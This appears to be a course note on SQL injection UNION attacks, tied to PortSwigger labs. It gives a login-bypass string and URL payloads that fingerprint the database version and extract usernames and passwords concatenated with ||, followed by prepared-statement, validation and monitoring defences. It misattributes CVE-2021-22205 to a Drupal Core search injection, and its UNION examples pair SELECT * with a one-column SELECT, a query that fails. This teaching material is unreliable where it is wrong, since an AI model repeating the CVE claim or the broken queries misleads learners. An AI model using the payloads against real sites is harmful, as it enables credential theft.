---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Understanding SQL Injection and UNION Attacks

### Introduction to SQL Injection

SQL Injection (SQLi) is one of the most prevalent and dangerous types of vulnerabilities in web applications. It occurs when an attacker manipulates input data to execute arbitrary SQL commands on the backend database. This can lead to unauthorized access to sensitive data, data manipulation, or even complete compromise of the application.

#### What is SQL Injection?

SQL Injection is a code injection technique that exploits vulnerabilities in the way an application handles user-supplied input. Specifically, it involves inserting malicious SQL statements into input fields that are later executed by the database engine. This can allow attackers to bypass authentication mechanisms, retrieve sensitive data, or manipulate the database in ways that were not intended by the developers.

#### Why Does SQL Injection Matter?

SQL Injection attacks can have severe consequences, including:

- **Data Theft**: Attackers can extract sensitive information such as usernames, passwords, credit card details, and personal data.
- **Data Manipulation**: Attackers can modify or delete data within the database, leading to data corruption or loss.
- **Privilege Escalation**: In some cases, attackers can gain elevated privileges and perform actions that they should not be authorized to do.

#### How Does SQL Injection Work?

To understand how SQL Injection works, consider a simple login form where a user enters their username and password. The application might construct an SQL query like this:

```sql
SELECT * FROM users WHERE username = 'username' AND password = 'password';
```

If the application does not properly sanitize the input, an attacker could inject malicious SQL code. For example, if the attacker inputs `username` as `' OR '1'='1` and `password` as `anything`, the resulting SQL query would be:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything';
```

This query will return all rows from the `users` table because the condition `'1'='1'` is always true.

### Identifying the Database Type

Before performing a SQL Injection attack, it is crucial to determine the type of database being used. Different databases have different syntaxes for executing commands and manipulating data. Therefore, identifying the database type helps in crafting the appropriate SQL injection payloads.

#### Using the Database Version Command

One common method to identify the database type is by using the `version()` function, which returns the version number of the database. This function is supported by many popular databases, including PostgreSQL, MySQL, and Microsoft SQL Server.

For example, in PostgreSQL, the `version()` function can be used as follows:

```sql
SELECT version();
```

This query will return the version number of the PostgreSQL database, which can help in determining the specific version and potentially the vulnerabilities associated with that version.

#### Example: Identifying PostgreSQL

Let's assume we are trying to identify the database type and we suspect it might be PostgreSQL. We can use the following SQL injection payload:

```sql
http://example.com/login?username=admin' UNION SELECT version() --&password=anything
```

The resulting SQL query would be:

```sql
SELECT * FROM users WHERE username = 'admin' UNION SELECT version() --' AND password = 'anything';
```

If the database is indeed PostgreSQL, this query will return the version number of the PostgreSQL database.

### String Concatenation in PostgreSQL

Once the database type is identified, the next step is to understand how to concatenate strings in that particular database. String concatenation is often necessary when combining multiple pieces of data into a single column.

#### String Concatenation Syntax in PostgreSQL

In PostgreSQL, string concatenation is performed using the `||` operator. For example, to concatenate two strings, you can use:

```sql
SELECT 'Hello' || 'World';
```

This query will return the string `HelloWorld`.

#### Example: Concatenating Username and Password

Suppose we want to retrieve both the username and password in a single column. We can use the `||` operator to concatenate these values. The SQL query would look like this:

```sql
SELECT username || ' ' || password FROM users;
```

This query will return a single column with the concatenated values of the username and password separated by a space.

### Crafting the SQL Injection Payload

Now that we know the database type and how to concatenate strings, we can craft the SQL injection payload to retrieve multiple values in a single column.

#### Example: Retrieving Username and Password

Assuming we have identified the database as PostgreSQL, we can use the following SQL injection payload:

```sql
http://example.com/login?username=admin' UNION SELECT username || ' ' || password FROM users --&password=anything
```

The resulting SQL query would be:

```sql
SELECT * FROM users WHERE username = 'admin' UNION SELECT username || ' ' || password FROM users --' AND password = 'anything';
```

This query will return a single column with the concatenated values of the username and password.

### Handling the Output

When the SQL injection payload is executed, the output will contain the concatenated values of the username and password. However, it may not be immediately clear where the username ends and the password begins.

#### Example: Parsing the Output

To parse the output, we can look for patterns or delimiters that separate the username and password. For example, if the output looks like `admin password123`, we can split the string at the space character to separate the username and password.

### Real-World Examples and Recent Breaches

#### CVE-2021-22205: Drupal Core SQL Injection Vulnerability

In 2021, a critical SQL Injection vulnerability was discovered in Drupal Core (CVE-2021-22205). This vulnerability allowed attackers to inject malicious SQL code through the search functionality, leading to unauthorized access to sensitive data.

#### Example: Exploiting the Vulnerability

The following is a simplified example of how an attacker might exploit this vulnerability:

```sql
http://example.com/search?q=admin' UNION SELECT username || ' ' || password FROM users --
```

This payload would return the concatenated values of the username and password, allowing the attacker to extract sensitive information.

### How to Prevent / Defend Against SQL Injection

#### Secure Coding Practices

1. **Use Prepared Statements**: Prepared statements ensure that user input is treated as data rather than executable code. This prevents SQL injection attacks.

    ```sql
    PreparedStatement pstmt = connection.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");
    pstmt.setString(1, username);
    pstmt.setString(2, password);
    ResultSet rs = pstmt.executeQuery();
    ```

2. **Input Validation**: Validate all user input to ensure it conforms to expected formats. Use regular expressions or other validation techniques to filter out invalid characters.

    ```java
    public boolean validateUsername(String username) {
        return username.matches("[a-zA-Z0-9]+");
    }
    ```

3. **Parameterized Queries**: Use parameterized queries to separate SQL logic from user input.

    ```sql
    SELECT * FROM users WHERE username = :username AND password = :password;
    ```

#### Hardening the Database

1. **Least Privilege Principle**: Ensure that database users have the minimum permissions required to perform their tasks. Avoid granting unnecessary privileges.

2. **Database Configuration**: Configure the database to disable unnecessary features and limit the exposure of sensitive information.

    ```sql
    -- Disable unnecessary features
    ALTER DATABASE mydb SET parameter_name TO value;
    ```

3. **Regular Audits**: Perform regular audits of database configurations and user permissions to identify and mitigate potential vulnerabilities.

#### Detection and Monitoring

1. **Intrusion Detection Systems (IDS)**: Implement IDS to monitor for suspicious activities and potential SQL injection attempts.

2. **Logging and Monitoring**: Enable detailed logging of database activities and monitor logs for signs of SQL injection attacks.

    ```sql
    -- Enable detailed logging
    ALTER DATABASE mydb SET log_statement = 'all';
    ```

### Conclusion

SQL Injection is a serious threat to web applications, but it can be effectively prevented through secure coding practices, proper database configuration, and continuous monitoring. By understanding the mechanics of SQL Injection and implementing robust defenses, developers can protect their applications from this common and dangerous vulnerability.

### Practice Labs

For hands-on practice with SQL Injection and UNION attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs specifically designed to teach SQL Injection techniques.
- **OWASP Juice Shop**: A deliberately insecure web application that includes various SQL Injection challenges.
- **DVWA (Damn Vulnerable Web Application)**: Provides a range of SQL Injection vulnerabilities for testing and learning purposes.
- **WebGoat**: An interactive training application that includes exercises on SQL Injection and other web security topics.

By engaging with these labs, you can gain practical experience in identifying and mitigating SQL Injection vulnerabilities.

---
<!-- nav -->
[[03-SQL Injection Union Attack Retrieving Multiple Values in a Single Column|SQL Injection Union Attack Retrieving Multiple Values in a Single Column]] | [[Web Security (PortSwigger)/02-SQL Injection/07-Lab 6 SQL injection UNION attack retrieving multiple values in a single column/00-Overview|Overview]] | [[05-Understanding SQL Injection and Union Attacks|Understanding SQL Injection and Union Attacks]]
